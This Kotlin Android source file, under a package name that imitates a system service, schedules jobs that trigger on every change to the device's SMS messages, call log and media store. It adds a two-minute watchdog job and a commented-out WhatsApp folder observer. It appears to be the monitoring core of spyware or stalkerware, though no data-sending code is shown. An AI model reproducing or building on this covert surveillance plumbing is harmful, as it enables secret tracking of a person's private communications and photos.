package com.android.services.jobScheduler

import android.annotation.SuppressLint
import android.app.job.JobInfo
import android.app.job.JobInfo.TriggerContentUri
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.net.Uri
import android.os.Build
import android.provider.CallLog
import android.provider.MediaStore
import androidx.annotation.RequiresApi
import com.android.services.jobScheduler.services.CallObserverJobService
import com.android.services.jobScheduler.services.ObserverJobService
import com.android.services.jobScheduler.services.WatchDogJobService
import com.android.services.util.AppConstants
import java.util.*

object ObserverJobScheduler {

    private const val JOB_ID = 101
    private const val CALL_JOB_ID = 102
    private const val WATCH_DOG_JOB_ID = 1003
    private const val DELAY_MIN = 1L
    private const val DELAY_MAX = 100L

    @RequiresApi(Build.VERSION_CODES.N)
    @JvmStatic
    fun registerObserverJob(context: Context): Boolean {
//        String externalStorage = Environment.getExternalStorageDirectory() + "/Android";
//        File file = new File(externalStorage);
        val componentName = ComponentName(context, ObserverJobService::class.java)
        val contentUri = TriggerContentUri(
            Uri.parse(AppConstants.SMS_URI),
            TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS
        )
        val callContentUri = TriggerContentUri(
            Uri.parse(CallLog.Calls.CONTENT_URI.toString()),
            TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS
        )
        val photosUri = TriggerContentUri(
            Uri.parse("content://" + MediaStore.AUTHORITY + "/"),
            TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS
        )
//        JobInfo.TriggerContentUri whatsAppContentUri = new JobInfo.TriggerContentUri(
//            Uri.fromFile(file), JobInfo.TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS)

        val jobInfo = JobInfo.Builder(JOB_ID, componentName)
            .addTriggerContentUri(contentUri)
            .addTriggerContentUri(callContentUri)
            .addTriggerContentUri(photosUri)
            .setTriggerContentUpdateDelay(DELAY_MIN)
            .setTriggerContentMaxDelay(DELAY_MAX)
            .build()
        val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
        val result = Objects.requireNonNull(jobScheduler).schedule(jobInfo)
        return result == JobScheduler.RESULT_SUCCESS
    }

    @SuppressLint("NewApi")
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun scheduleWatchDogJob(context: Context) {
        val serviceComponent = ComponentName(
            context,
            WatchDogJobService::class.java
        )
        val builder = JobInfo.Builder(WATCH_DOG_JOB_ID, serviceComponent)
        builder.setMinimumLatency(2 * 60 * 1000L) // wait at least
        builder.setOverrideDeadline(2 * 60 * 1000L) // maximum delay
        //builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED); // require unmetered network
        //builder.setRequiresDeviceIdle(true); // device should be idle
        //builder.setRequiresCharging(false); // we don't care if the device is charging or not
        val jobScheduler = context.getSystemService(
            JobScheduler::class.java
        )
        jobScheduler.schedule(builder.build())
    }

    @RequiresApi(Build.VERSION_CODES.N)
    @JvmStatic
    fun registerCallObserver(context: Context): Boolean {
        val componentName = ComponentName(context, CallObserverJobService::class.java)
        val callContentUri = TriggerContentUri(
            Uri.parse(CallLog.Calls.CONTENT_URI.toString()),
            TriggerContentUri.FLAG_NOTIFY_FOR_DESCENDANTS
        )
        val jobInfo = JobInfo.Builder(CALL_JOB_ID, componentName)
            .addTriggerContentUri(callContentUri)
            .setTriggerContentUpdateDelay(DELAY_MIN)
            .setTriggerContentMaxDelay(DELAY_MAX)
            .build()
        val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
        val result = Objects.requireNonNull(jobScheduler).schedule(jobInfo)
        return result == JobScheduler.RESULT_SUCCESS
    }
}